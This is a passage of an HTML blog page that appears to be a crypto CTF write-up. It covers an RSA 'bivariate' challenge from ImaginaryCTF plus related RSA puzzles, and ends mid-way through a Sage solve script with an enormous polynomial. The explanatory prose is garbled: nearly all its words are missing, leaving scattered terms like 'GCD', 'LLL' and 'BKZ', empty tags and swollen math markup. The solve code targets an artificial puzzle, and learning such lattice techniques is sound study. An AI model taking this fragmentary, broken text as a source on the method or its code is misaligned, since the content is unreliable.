3*y^6 + x^5 - 3*x^4*y + x^3*y^2 + x^2*y^3 - 2*x*y^4 + 2*x^4 - 2*x^3*y + 6*x^2*y^2 - 3*x*y^3 - 2*y^4 - 5*x^3 - 2*x^2*y - 2*x*y^2 + 3*y^3 + 2*x^2 - x*y + y^2 - 2*x + 2*y - 2</span></span><br><span class="line"><span class="string">w = 12796020294902567574981427270787776254781813995526831579805652479456168245098217943847166109912113827479436654134179666391771173421469188197935460525521295192736123648410762964187396897298542198935971755852754544978564521188423737649175136194386664628304164316905741781089536713701674793641345344818309314224</span></span><br><span class="line"><span class="string">c = 10266913434526071998707605266130137733134248608585146234981245806763995653822203763396430876254213500327272952979577138542487120755771047170064775346450942</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>emmm<strong>github</strong><strong>pow(2,f(p,q),n)</strong>()<br /><img src="https://picx.zhimg.com/80/v2-42436e9a39d3de9fa72f9af9ef543381_1440w.png" alt="" /><br /><strong>GCDp</strong><code>flag</code><br /><code>ictf</code>()<code>wp</code></p><p>(<code>wp</code><code>exp</code><code>cf</code>)</p><p><a href="https://imaginaryctf.org/ArchivedChallenges">https://imaginaryctf.org/ArchivedChallenges</a><br /><strong>Archived Challenges - February 2025 - Crypto - bivariate (110pts) - 10/02</strong></p><p><strong>EZ_Fermat</strong></p><p><code>p</code>80</p><p><strong>2024</strong><strong>rsa-loss</strong><strong>bcactf-4.0rsa_is_broken</strong></p><p><strong>2024rsa-loss</strong><code>csdn</code><a href="https://blog.csdn.net/XiongSiqi_blog/article/details/141638136">https://blog.csdn.net/XiongSiqi_blog/article/details/141638136</a></p><p><a href="https://tangcuxiaojikuai.xyz/post/94c7e291.html"></a><br /><img src="https://picx.zhimg.com/80/v2-8b39516006a4e7434a581a17a06427fd_1440w.png" alt="" /></p><p>(<strong>flag</strong><strong></strong><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext><mi>s</mi><mi>u</mi><mi>m</mi><mo stretchy="false">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo></mo><mn>25</mn><msup><mn>5</mn><mi>i</mi></msup><mo stretchy="false">)</mo><mtext></mtext></mrow><annotation encoding="application/x-tex">\ sum(a_{i}*255^{i})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mspace"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord mathnormal">m</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0746639999999998em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mord">5</span><span class="mord"><span class="mord">5</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.824664em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span></span></span></span>)<strong>ASCII4857</strong>10</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>t</mi><mi>i</mi></msub><mo>=</mo><msub><mi>a</mi><mi>i</mi></msub><mo></mo><mn>48</mn></mrow><annotation encoding="application/x-tex">t_{i}=a_{i}-48</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76508em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mord">8</span></span></span></span><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>t</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">t_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76508em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>0-9<code>c</code></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub><mo></mo><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>9</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">a_{i}\in [0,9]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6891em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">9</span><span class="mclose">]</span></span></span></span>4/54/5<strong></strong></p><p><strong>LLL</strong><strong></strong><strong></strong><strong>BKZ</strong>(<strong></strong>)<strong></strong><strong></strong>()0<br /><img src="https://picx.zhimg.com/80/v2-f2f550ed8174549011cf7074e302cbc0_1440w.png" alt="" /><br /><strong></strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">P.&lt;x,y&gt; = ZZ[]</span><br><span class="line">n = <span class="number">95656952327201449381426394713246214670537600365883923624876350719801926817916514429721785287844335184715049179879891389941974481490433975689601829920289485889138252888029716516069912637121531561601839948367426922036690701168975937162280451323099126372019216020898338909808577022618554997063496690156977790629</span></span><br><span class="line">f = x^<span class="number">31</span> - x^<span class="number">30</span>*y - <span class="number">2</span>*x^<span class="number">29</span>*y^<span class="number">2</span> + <span class="number">7</span>*x^<span class="number">28</span>*y^<span class="number">3</span> + <span class="number">2</span>*x^<span class="number">27</span>*y^<span class="number">4</span> - <span class="number">4</span>*x^<span class="number">24</span>*y^<span class="number">7</span> + <span class="number">3</span>*x^<span class="number">23</span>*y^<span class="number">8</span> - x^<span class="number">20</span>*y^<span class="number">11</span> - <span class="number">4</span>*x^<span class="number">19</span>*y^<span class="number">12</span> + x^<span class="number">18</span>*y^<span class="number">13</span> - <span class="number">5</span>*x^<span class="number">17</span>*y^<span class="number">14</span> - <span class="number">4</span>*x^<span class="number">16</span>*y^<span class="number">15</span> - x^<span class="number">15</span>*y^<span class="number">16</span> + x^<span class="number">14</span>*y^<span class="number">17</span> + x^<span class="number">13</span>*y^<span class="number">18</span> + x^<span class="number">12</span>*y^<span class="number">19</span> - <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">20</span> - <span class="number">3</span>*x^<span class="number">9</span>*y^<span class="number">22</span> + <span class="number">5</span>*x^<span class="number">7</span>*y^<span class="number">24</span> + x^<span class="number">6</span>*y^<span class="number">25</span> + <span class="number">6</span>*x^<span class="number">4</span>*y^<span class="number">27</span> + x^<span class="number">3</span>*y^<span class="number">28</span> + <span class="number">2</span>*x*y^<span class="number">30</span> + y^<span class="number">31</span> - <span class="number">2</span>*x^<span class="number">30</span> - <span class="number">3</span>*x^<span class="number">29</span>*y + <span class="number">2</span>*x^<span class="number">28</span>*y^<span class="number">2</span> + <span class="number">2</span>*x^<span class="number">27</span>*y^<span class="number">3</span> - x^<span class="number">26</span>*y^<span class="number">4</span> - x^<span class="number">25</span>*y^<span class="number">5</span> - <span class="number">2</span>*x^<span class="number">24</span>*y^<span class="number">6</span> - <span class="number">3</span>*x^<span class="number">23</span>*y^<span class="number">7</span> - <span class="number">3</span>*x^<span class="number">22</span>*y^<span class="number">8</span> - <span class="number">3</span>*x^<span class="number">20</span>*y^<span class="number">10</span> - <span class="number">4</span>*x^<span class="number">19</span>*y^<span class="number">11</span> + <span class="number">2</span>*x^<span class="number">18</span>*y^<span class="number">12</span> + x^<span class="number">15</span>*y^<span class="number">15</span> - x^<span class="number">14</span>*y^<span class="number">16</span> - <span class="number">2</span>*x^<span class="number">12</span>*y^<span class="number">18</span> - <span class="number">3</span>*x^<span class="number">11</span>*y^<span class="number">19</span> - x^<span class="number">10</span>*y^<span class="number">20</span> + x^<span class="number">9</span>*y^<span class="number">21</span> + <span class="number">2</span>*x^<span class="number">8</span>*y^<span class="number">22</span> + x^<span class="number">7</span>*y^<span class="number">23</span> + x^<span class="number">5</span>*y^<span class="number">25</span> - x^<span class="number">4</span>*y^<span class="number">26</span> - <span class="number">2</span>*x^<span class="number">3</span>*y^<span class="number">27</span> - <span class="number">2</span>*x^<span class="number">2</span>*y^<span class="number">28</span> - y^<span class="number">30</span> - <span class="number">2</span>*x^<span class="number">29</span> - x^<span class="number">28</span>*y + <span class="number">3</span>*x^<span class="number">26</span>*y^<span class="number">3</span> - x^<span class="number">25</span>*y^<span class="number">4</span> - <span class="number">2</span>*x^<span class="number">24</span>*y^<span class="number">5</span> + x^<span class="number">23</span>*y^<span class="number">6</span> - x^<span class="number">22</span>*y^<span class="number">7</span> - x^<span class="number">20</span>*y^<span class="number">9</span> + <span class="number">2</span>*x^<span class="number">19</span>*y^<span class="number">10</span> + <span class="number">2</span>*x^<span class="number">18</span>*y^<span class="number">11</span> + x^<span class="number">16</span>*y^<span class="number">13</span> + x^<span class="number">15</span>*y^<span class="number">14</span> + x^<span class="number">14</span>*y^<span class="number">15</span> + x^<span class="number">13</span>*y^<span class="number">16</span> + x^<span class="number">12</span>*y^<span class="number">17</span> + <span class="number">5</span>*x^<span class="number">11</span>*y^<span class="number">18</span> - x^<span class="number">9</span>*y^<span class="number">20</span> - <span class="number">2</span>*x^<span class="number">8</span>*y^<span class="number">21</span> - <span class="number">5</span>*x^<span class="number">7</span>*y^<span class="number">22</span> - <span class="number">2</span>*x^<span class="number">6</span>*y^<span class="number">23</span> + <span class="number">3</span>*x^<span class="number">5</span>*y^<span class="number">24</span> - <span class="number">5</span>*x^<span class="number">3</span>*y^<span class="number">26</span> - x^<span class="number">2</span>*y^<span class="number">27</span> + <span class="number">2</span>*x*y^<span class="number">28</span> - y^<span class="number">29</span> + <span class="number">3</span>*x^<span class="number">28</span> + <span class="number">3</span>*x^<span class="number">27</span>*y - <span class="number">2</span>*x^<span class="number">26</span>*y^<span class="number">2</span> + x^<span class="number">25</span>*y^<span class="number">3</span> + <span class="number">2</span>*x^<span class="number">24</span>*y^<span class="number">4</span> - x^<span class="number">23</span>*y^<span class="number">5</span> - <span class="number">2</span>*x^<span class="number">22</span>*y^<span class="number">6</span> - <span class="number">3</span>*x^<span class="number">20</span>*y^<span class="number">8</span> - <span class="number">3</span>*x^<span class="number">19</span>*y^<span class="number">9</span> + <span class="number">4</span>*x^<span class="number">17</span>*y^<span class="number">11</span> - x^<span class="number">16</span>*y^<span class="number">12</span> - <span class="number">3</span>*x^<span class="number">15</span>*y^<span class="number">13</span> - <span class="number">2</span>*x^<span class="number">14</span>*y^<span class="number">14</span> + x^<span class="number">13</span>*y^<span class="number">15</span> + <span class="number">2</span>*x^<span class="number">12</span>*y^<span class="number">16</span> - <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">17</span> + x^<span class="number">10</span>*y^<span class="number">18</span> - <span class="number">2</span>*x^<span class="number">9</span>*y^<span class="number">19</span> + x^<span class="number">8</span>*y^<span class="number">20</span> - <span class="number">2</span>*x^<span class="number">7</span>*y^<span class="number">21</span> - x^<span class="number">6</span>*y^<span class="number">22</span> + x^<span class="number">5</span>*y^<span class="number">23</span> - x^<span class="number">4</span>*y^<span class="number">24</span> + x^<span class="number">3</span>*y^<span class="number">25</span> + x^<span class="number">2</span>*y^<span class="number">26</span> - x*y^<span class="number">27</span> - y^<span class="number">28</span> + x^<span class="number">27</span> + x^<span class="number">26</span>*y - <span class="number">2</span>*x^<span class="number">24</span>*y^<span class="number">3</span> + x^<span class="number">23</span>*y^<span class="number">4</span> - <span class="number">3</span>*x^<span class="number">22</span>*y^<span class="number">5</span> - <span class="number">2</span>*x^<span class="number">21</span>*y^<span class="number">6</span> - <span class="number">2</span>*x^<span class="number">20</span>*y^<span class="number">7</span> - <span class="number">5</span>*x^<span class="number">19</span>*y^<span class="number">8</span> + <span class="number">2</span>*x^<span class="number">18</span>*y^<span class="number">9</span> - <span class="number">5</span>*x^<span class="number">17</span>*y^<span class="number">10</span> + x^<span class="number">16</span>*y^<span class="number">11</span> - <span class="number">3</span>*x^<span class="number">15</span>*y^<span class="number">12</span> - <span class="number">4</span>*x^<span class="number">14</span>*y^<span class="number">13</span> - x^<span class="number">13</span>*y^<span class="number">14</span> + x^<span class="number">12</span>*y^<span class="number">15</span> + <span class="number">3</span>*x^<span class="number">11</span>*y^<span class="number">16</span> + <span class="number">2</span>*x^<span class="number">10</span>*y^<span class="number">17</span> - <span class="number">4</span>*x^<span class="number">9</span>*y^<span class="number">18</span> - <span class="number">2</span>*x^<span class="number">6</span>*y^<span class="number">21</span> + x^<span class="number">5</span>*y^<span class="number">22</span> + <span class="number">4</span>*x^<span class="number">3</span>*y^<span class="number">24</span> + <span class="number">2</span>*x^<span class="number">2</span>*y^<span class="number">25</span> + <span class="number">2</span>*x*y^<span class="number">26</span> - <span class="number">2</span>*y^<span class="number">27</span> + x^<span class="number">25</span>*y + x^<span class="number">24</span>*y^<span class="number">2</span> + x^<span class="number">23</span>*y^<span class="number">3</span> + <span class="number">5</span>*x^<span class="number">22</span>*y^<span class="number">4</span> + x^<span class="number">20</span>*y^<span class="number">6</span> - <span class="number">3</span>*x^<span class="number">19</span>*y^<span class="number">7</span> + x^<span class="number">18</span>*y^<span class="number">8</span> - x^<span class="number">17</span>*y^<span class="number">9</span> + <span class="number">2</span>*x^<span class="number">15</span>*y^<span class="number">11</span> - x^<span class="number">14</span>*y^<span class="number">12</span> + <span class="number">2</span>*x^<span class="number">13</span>*y^<span class="number">13</span> - x^<span class="number">12</span>*y^<span class="number">14</span> + <span class="number">4</span>*x^<span class="number">11</span>*y^<span class="number">15</span> - x^<span class="number">10</span>*y^<span class="number">16</span> - <span class="number">2</span>*x^<span class="number">6</span>*y^<span class="number">20</span> - x^<span class="number">5</span>*y^<span class="number">21</span> + <span class="number">3</span>*x^<span class="number">3</span>*y^<span class="number">23</span> + x^<span class="number">2</span>*y^<span class="number">24</span> - <span class="number">3</span>*x*y^<span class="number">25</span> - <span class="number">3</span>*y^<span class="number">26</span> + <span class="number">3</span>*x^<span class="number">25</span> - <span class="number">2</span>*x^<span class="number">23</span>*y^<span class="number">2</span> - x^<span class="number">21</span>*y^<span class="number">4</span> + x^<span class="number">17</span>*y^<span class="number">8</span> + <span class="number">2</span>*x^<span class="number">16</span>*y^<span class="number">9</span> - x^<span class="number">15</span>*y^<span class="number">10</span> - <span class="number">2</span>*x^<span class="number">14</span>*y^<span class="number">11</span> - x^<span class="number">13</span>*y^<span class="number">12</span> + <span class="number">2</span>*x^<span class="number">12</span>*y^<span class="number">13</span> - <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">14</span> - x^<span class="number">9</span>*y^<span class="number">16</span> - x^<span class="number">8</span>*y^<span class="number">17</span> - x^<span class="number">6</span>*y^<span class="number">19</span> - x^<span class="number">5</span>*y^<span class="number">20</span> + x^<span class="number">4</span>*y^<span class="number">21</span> + x^<span class="number">3</span>*y^<span class="number">22</span> + <span class="number">5</span>*x*y^<span class="number">24</span> - <span class="number">2</span>*y^<span class="number">25</span> - x^<span class="number">24</span> + <span class="number">2</span>*x^<span class="number">23</span>*y + x^<span class="number">22</span>*y^<span class="number">2</span> - x^<span class="number">21</span>*y^<span class="number">3</span> - x^<span class="number">19</span>*y^<span class="number">5</span> + x^<span class="number">18</span>*y^<span class="number">6</span> - x^<span class="number">17</span>*y^<span class="number">7</span> + <span class="number">2</span>*x^<span class="number">16</span>*y^<span class="number">8</span> - <span class="number">4</span>*x^<span class="number">15</span>*y^<span class="number">9</span> - x^<span class="number">14</span>*y^<span class="number">10</span> - x^<span class="number">13</span>*y^<span class="number">11</span> - x^<span class="number">12</span>*y^<span class="number">12</span> + <span class="number">4</span>*x^<span class="number">10</span>*y^<span class="number">14</span> + <span class="number">2</span>*x^<span class="number">9</span>*y^<span class="number">15</span> - x^<span class="number">8</span>*y^<span class="number">16</span> - <span class="number">2</span>*x^<span class="number">7</span>*y^<span class="number">17</span> - <span class="number">2</span>*x^<span class="number">6</span>*y^<span class="number">18</span> + <span class="number">4</span>*x^<span class="number">5</span>*y^<span class="number">19</span> + x^<span class="number">4</span>*y^<span class="number">20</span> + <span class="number">2</span>*x^<span class="number">2</span>*y^<span class="number">22</span> - <span class="number">5</span>*x*y^<span class="number">23</span> - y^<span class="number">24</span> + x^<span class="number">23</span> - x^<span class="number">22</span>*y + <span class="number">2</span>*x^<span class="number">21</span>*y^<span class="number">2</span> - x^<span class="number">20</span>*y^<span class="number">3</span> - x^<span class="number">18</span>*y^<span class="number">5</span> - x^<span class="number">17</span>*y^<span class="number">6</span> - <span class="number">5</span>*x^<span class="number">15</span>*y^<span class="number">8</span> + x^<span class="number">14</span>*y^<span class="number">9</span> - <span class="number">3</span>*x^<span class="number">13</span>*y^<span class="number">10</span> + <span class="number">3</span>*x^<span class="number">12</span>*y^<span class="number">11</span> + <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">12</span> - <span class="number">2</span>*x^<span class="number">10</span>*y^<span class="number">13</span> - <span class="number">2</span>*x^<span class="number">9</span>*y^<span class="number">14</span> - x^<span class="number">8</span>*y^<span class="number">15</span> + <span class="number">2</span>*x^<span class="number">7</span>*y^<span class="number">16</span> - <span class="number">2</span>*x^<span class="number">6</span>*y^<span class="number">17</span> - <span class="number">4</span>*x^<span class="number">5</span>*y^<span class="number">18</span> - <span class="number">5</span>*x^<span class="number">3</span>*y^<span class="number">20</span> - x^<span class="number">2</span>*y^<span class="number">21</span> - x*y^<span class="number">22</span> - <span class="number">4</span>*y^<span class="number">23</span> - x^<span class="number">22</span> + <span class="number">2</span>*x^<span class="number">21</span>*y - <span class="number">2</span>*x^<span class="number">20</span>*y^<span class="number">2</span> - <span class="number">2</span>*x^<span class="number">19</span>*y^<span class="number">3</span> - <span class="number">3</span>*x^<span class="number">17</span>*y^<span class="number">5</span> - x^<span class="number">16</span>*y^<span class="number">6</span> - x^<span class="number">15</span>*y^<span class="number">7</span> + <span class="number">4</span>*x^<span class="number">13</span>*y^<span class="number">9</span> + <span class="number">2</span>*x^<span class="number">12</span>*y^<span class="number">10</span> + <span class="number">3</span>*x^<span class="number">11</span>*y^<span class="number">11</span> + <span class="number">2</span>*x^<span class="number">10</span>*y^<span class="number">12</span> - x^<span class="number">9</span>*y^<span class="number">13</span> - x^<span class="number">7</span>*y^<span class="number">15</span> + <span class="number">2</span>*x^<span class="number">6</span>*y^<span class="number">16</span> + x^<span class="number">3</span>*y^<span class="number">19</span> + <span class="number">2</span>*x^<span class="number">2</span>*y^<span class="number">20</span> + <span class="number">2</span>*x*y^<span class="number">21</span> + <span class="number">3</span>*y^<span class="number">22</span> - <span class="number">3</span>*x^<span class="number">21</span> - x^<span class="number">20</span>*y - x^<span class="number">19</span>*y^<span class="number">2</span> + <span class="number">2</span>*x^<span class="number">17</span>*y^<span class="number">4</span> - x^<span class="number">16</span>*y^<span class="number">5</span> - x^<span class="number">15</span>*y^<span class="number">6</span> + x^<span class="number">14</span>*y^<span class="number">7</span> - <span class="number">5</span>*x^<span class="number">12</span>*y^<span class="number">9</span> - <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">10</span> + x^<span class="number">10</span>*y^<span class="number">11</span> + x^<span class="number">6</span>*y^<span class="number">15</span> + x^<span class="number">5</span>*y^<span class="number">16</span> + x^<span class="number">4</span>*y^<span class="number">17</span> - <span class="number">3</span>*x^<span class="number">2</span>*y^<span class="number">19</span> - <span class="number">2</span>*x*y^<span class="number">20</span> - <span class="number">2</span>*y^<span class="number">21</span> + x^<span class="number">20</span> + <span class="number">2</span>*x^<span class="number">19</span>*y - <span class="number">2</span>*x^<span class="number">17</span>*y^<span class="number">3</span> + <span class="number">2</span>*x^<span class="number">16</span>*y^<span class="number">4</span> - <span class="number">3</span>*x^<span class="number">15</span>*y^<span class="number">5</span> + <span class="number">4</span>*x^<span class="number">14</span>*y^<span class="number">6</span> + <span class="number">2</span>*x^<span class="number">13</span>*y^<span class="number">7</span> - x^<span class="number">12</span>*y^<span class="number">8</span> - <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">9</span> + x^<span class="number">10</span>*y^<span class="number">10</span> + <span class="number">6</span>*x^<span class="number">9</span>*y^<span class="number">11</span> + x^<span class="number">8</span>*y^<span class="number">12</span> + x^<span class="number">7</span>*y^<span class="number">13</span> + <span class="number">2</span>*x^<span class="number">5</span>*y^<span class="number">15</span> + <span class="number">4</span>*x^<span class="number">4</span>*y^<span class="number">16</span> + x^<span class="number">3</span>*y^<span class="number">17</span> - x^<span class="number">2</span>*y^<span class="number">18</span> + <span class="number">3</span>*x*y^<span class="number">19</span> - x^<span class="number">17</span>*y^<span class="number">2</span> + <span class="number">2</span>*x^<span class="number">16</span>*y^<span class="number">3</span> + <span class="number">3</span>*x^<span class="number">14</span>*y^<span class="number">5</span> - x^<span class="number">13</span>*y^<span class="number">6</span> + <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">8</span> + x^<span class="number">10</span>*y^<span class="number">9</span> + <span class="number">3</span>*x^<span class="number">9</span>*y^<span class="number">10</span> - x^<span class="number">7</span>*y^<span class="number">12</span> - x^<span class="number">6</span>*y^<span class="number">13</span> + <span class="number">3</span>*x^<span class="number">5</span>*y^<span class="number">14</span> - <span class="number">4</span>*x^<span class="number">4</span>*y^<span class="number">15</span> + x^<span class="number">2</span>*y^<span class="number">17</span> + <span class="number">2</span>*y^<span class="number">19</span> - x^<span class="number">18</span> - x^<span class="number">16</span>*y^<span class="number">2</span> - <span class="number">2</span>*x^<span class="number">14</span>*y^<span class="number">4</span> - <span class="number">2</span>*x^<span class="number">13</span>*y^<span class="number">5</span> - <span class="number">2</span>*x^<span class="number">12</span>*y^<span class="number">6</span> + <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">7</span> + <span class="number">3</span>*x^<span class="number">9</span>*y^<span class="number">9</span> + <span class="number">3</span>*x^<span class="number">8</span>*y^<span class="number">10</span> + x^<span class="number">6</span>*y^<span class="number">12</span> - x^<span class="number">4</span>*y^<span class="number">14</span> + <span class="number">2</span>*x^<span class="number">3</span>*y^<span class="number">15</span> + <span class="number">2</span>*x^<span class="number">2</span>*y^<span class="number">16</span> - <span class="number">2</span>*x*y^<span class="number">17</span> - x^<span class="number">17</span> - <span class="number">4</span>*x^<span class="number">16</span>*y - <span class="number">2</span>*x^<span class="number">15</span>*y^<span class="number">2</span> + <span class="number">2</span>*x^<span class="number">14</span>*y^<span class="number">3</span> - x^<span class="number">13</span>*y^<span class="number">4</span> + x^<span class="number">12</span>*y^<span class="number">5</span> - <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">6</span> - <span class="number">3</span>*x^<span class="number">10</span>*y^<span class="number">7</span> - x^<span class="number">9</span>*y^<span class="number">8</span> - <span class="number">5</span>*x^<span class="number">8</span>*y^<span class="number">9</span> + <span class="number">2</span>*x^<span class="number">7</span>*y^<span class="number">10</span> + <span class="number">2</span>*x^<span class="number">6</span>*y^<span class="number">11</span> - x^<span class="number">5</span>*y^<span class="number">12</span> + x^<span class="number">4</span>*y^<span class="number">13</span> - <span class="number">3</span>*x^<span class="number">2</span>*y^<span class="number">15</span> + x*y^<span class="number">16</span> - <span class="number">3</span>*x^<span class="number">16</span> + x^<span class="number">15</span>*y - <span class="number">3</span>*x^<span class="number">14</span>*y^<span class="number">2</span> - x^<span class="number">13</span>*y^<span class="number">3</span> - x^<span class="number">12</span>*y^<span class="number">4</span> + <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">5</span> - x^<span class="number">10</span>*y^<span class="number">6</span> + <span class="number">5</span>*x^<span class="number">8</span>*y^<span class="number">8</span> + <span class="number">3</span>*x^<span class="number">7</span>*y^<span class="number">9</span> + <span class="number">3</span>*x^<span class="number">6</span>*y^<span class="number">10</span> + <span class="number">2</span>*x^<span class="number">5</span>*y^<span class="number">11</span> + <span class="number">4</span>*x^<span class="number">4</span>*y^<span class="number">12</span> + <span class="number">2</span>*x^<span class="number">3</span>*y^<span class="number">13</span> + x^<span class="number">2</span>*y^<span class="number">14</span> - <span class="number">3</span>*x*y^<span class="number">15</span> - x^<span class="number">15</span> + <span class="number">3</span>*x^<span class="number">14</span>*y + x^<span class="number">13</span>*y^<span class="number">2</span> - x^<span class="number">12</span>*y^<span class="number">3</span> - <span class="number">3</span>*x^<span class="number">11</span>*y^<span class="number">4</span> + x^<span class="number">10</span>*y^<span class="number">5</span> - x^<span class="number">9</span>*y^<span class="number">6</span> + <span class="number">2</span>*x^<span class="number">8</span>*y^<span class="number">7</span> - x^<span class="number">7</span>*y^<span class="number">8</span> + <span class="number">4</span>*x^<span class="number">5</span>*y^<span class="number">10</span> - <span class="number">2</span>*x^<span class="number">4</span>*y^<span class="number">11</span> + x^<span class="number">3</span>*y^<span class="number">12</span> - x^<span class="number">14</span> + x^<span class="number">13</span>*y + <span class="number">2</span>*x^<span class="number">12</span>*y^<span class="number">2</span> + x^<span class="number">11</span>*y^<span class="number">3</span> - <span class="number">5</span>*x^<span class="number">10</span>*y^<span class="number">4</span> - x^<span class="number">9</span>*y^<span class="number">5</span> - <span class="number">3</span>*x^<span class="number">8</span>*y^<span class="number">6</span> - <span class="number">2</span>*x^<span class="number">7</span>*y^<span class="number">7</span> + x^<span class="number">6</span>*y^<span class="number">8</span> + <span class="number">3</span>*x^<span class="number">5</span>*y^<span class="number">9</span> + x^<span class="number">4</span>*y^<span class="number">10</span> + <span class="number">2</span>*x^<span class="number">3</span>*y^<span class="number">11</span> - x^<span class="number">2</span>*y^<span class="number">12</span> - <span class="number">4</span>*x*y^<span class="number">13</span> + <span class="number">3</span>*y^<span class="number">14</span> + x^<span class="number">12</span>*y - <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">2</span> - x^<span class="number">9</span>*y^<span class="number">4</span> - x^<span class="number">8</span>*y^<span class="number">5</span> + <span class="number">5</span>*x^<span class="number">7</span>*y^<span class="number">6</span> - <span class="number">4</span>*x^<span class="number">6</span>*y^<span class="number">7</span> + <span class="number">3</span>*x^<span class="number">5</span>*y^<span class="number">8</span> + <span class="number">4</span>*x^<span class="number">4</span>*y^<span class="number">9</span> - <span class="number">3</span>*x^<span class="number">3</span>*y^<span class="number">10</span> - x^<span class="number">2</span>*y^<span class="number">11</span> - <span class="number">2</span>*x*y^<span class="number">12</span> - <span class="number">3</span>*y^<span 